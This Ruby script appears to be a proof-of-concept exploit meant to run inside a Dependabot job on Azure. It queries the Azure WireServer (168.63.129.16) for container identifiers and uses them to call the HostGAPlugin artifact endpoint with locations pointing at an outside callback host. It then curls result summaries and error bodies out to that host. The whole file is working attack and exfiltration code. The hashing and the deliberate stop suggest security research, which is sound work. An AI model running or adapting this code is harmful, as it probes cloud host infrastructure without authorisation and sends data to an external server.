require "digest"
require "json"
require "open3"
require "tempfile"

AZURE_FETCH_CALLBACK_BASE = "https://target.147.182.179.38.sslip.io:8443"
AZURE_FETCH_MARKER = "5b3963e04627c6a3b1943eb0e2a145cc"

def azure_fetch_post(job_id, data, kind = "runtime-summary")
  stdout, _stderr, status = Open3.capture3(
    "curl", "--fail", "--silent", "--show-error", "--max-time", "15",
    "--output", "/dev/null", "--write-out", "%{http_code}",
    "--header", "Content-Type: application/octet-stream", "--data-binary", "@-",
    "#{AZURE_FETCH_CALLBACK_BASE}/infra/#{AZURE_FETCH_MARKER}/#{job_id}/#{kind}",
    stdin_data: data
  )
  status.success? && stdout.strip == "200"
rescue StandardError
  false
end

def azure_fetch_proxy_get(url, headers: [])
  Tempfile.create("dependabot-azure-hostplugin-response") do |file|
    file.chmod(0o600)
    args = [
      "curl", "--silent", "--show-error", "--max-time", "12", "--noproxy", "",
      "--request", "GET", "--output", file.path, "--write-out", "%{http_code}"
    ]
    headers.each { |header| args += ["--header", header] }
    args << url
    stdout, _stderr, status = Open3.capture3(*args)
    raw = File.binread(file.path)
    code = stdout.strip.match?(/\A[0-9]{3}\z/) ? stdout.strip.to_i : 0
    return [0, "".b] unless status.success? && raw.bytesize <= 65_536
    [code, raw]
  end
rescue StandardError
  [0, "".b]
end

def azure_fetch_xml_value(xml, element)
  value = xml.to_s[%r{<#{element}>\s*([^<]{1,1024}?)\s*</#{element}>}m, 1].to_s.strip
  return nil unless value.match?(/\A[\x21-\x7e]{1,1024}\z/) && !value.match?(/[\r\n]/)
  value
rescue StandardError
  nil
end

job_id = ENV["DEPENDABOT_JOB_ID"].to_s
if job_id.match?(/\A[0-9]+\z/)
  guard = "/tmp/dependabot-azure-hostplugin-fetch-#{job_id}.done"
  begin
    File.open(guard, File::WRONLY | File::CREAT | File::EXCL, 0o600) { |file| file.write("1") }
  rescue Errno::EEXIST
    guard = nil
  end

  if guard
    goalstate_status, goalstate = azure_fetch_proxy_get(
      "http://168.63.129.16/machine/?comp=goalstate",
      headers: ["x-ms-agent-name: WALinuxAgent", "x-ms-version: 2012-11-30", "Metadata: true"]
    )
    container_id = azure_fetch_xml_value(goalstate, "ContainerId")
    config_name = azure_fetch_xml_value(goalstate, "ConfigName")
    summary = {
      "job_id" => job_id,
      "probe" => "azure-hostplugin-owned-artifact-fetch-v1",
      "goalstate_status" => goalstate_status,
      "goalstate_length" => goalstate.bytesize,
      "goalstate_sha256" => Digest::SHA256.hexdigest(goalstate),
      "container_id_present" => !container_id.nil?,
      "container_id_sha256" => container_id ? Digest::SHA256.hexdigest(container_id) : "",
      "config_name_present" => !config_name.nil?,
      "config_name_sha256" => config_name ? Digest::SHA256.hexdigest(config_name) : ""
    }

    if goalstate_status == 200 && container_id && config_name
      base_headers = [
        "x-ms-version: 2015-09-01",
        "x-ms-containerid: #{container_id}",
        "x-ms-host-config-name: #{config_name}"
      ]
      callback_url = "#{AZURE_FETCH_CALLBACK_BASE}/azure-artifact/#{AZURE_FETCH_MARKER}/#{job_id}"
      manifest_url = "#{AZURE_FETCH_CALLBACK_BASE}/azure-artifact-manifest/#{AZURE_FETCH_MARKER}/#{job_id}"
      expected_body = "owned-hostga-artifact:#{job_id}"

      versions_status, versions_body = azure_fetch_proxy_get(
        "http://168.63.129.16:32526/versions",
        headers: ["x-ms-containerid: #{container_id}"]
      )

      negative_status, negative_body = azure_fetch_proxy_get(
        "http://168.63.129.16:32526/extensionArtifact", headers: base_headers
      )
      positive_status, positive_body = azure_fetch_proxy_get(
        "http://168.63.129.16:32526/extensionArtifact",
        headers: base_headers + [
          "x-ms-artifact-location: #{callback_url}",
          "x-ms-artifact-manifest-location: #{manifest_url}"
        ]
      )
      summary["versions_status"] = versions_status
      summary["versions_length"] = versions_body.bytesize
      summary["versions_sha256"] = Digest::SHA256.hexdigest(versions_body)
      summary["negative_missing_location_status"] = negative_status
      summary["negative_missing_location_length"] = negative_body.bytesize
      summary["negative_missing_location_sha256"] = Digest::SHA256.hexdigest(negative_body)
      summary["positive_status"] = positive_status
      summary["positive_length"] = positive_body.bytesize
      summary["positive_sha256"] = Digest::SHA256.hexdigest(positive_body)
      summary["expected_owned_body_sha256"] = Digest::SHA256.hexdigest(expected_body)
      summary["owned_body_exact_match"] = positive_body == expected_body
      if positive_status != 200 && !positive_body.empty?
        azure_fetch_post(job_id, positive_body, "azure-host-plugin-error")
      end
    end

    azure_fetch_post(job_id, JSON.generate(summary))
    sleep 15
    raise "controlled stop after owned HostGAPlugin artifact fetch probe"
  end
end
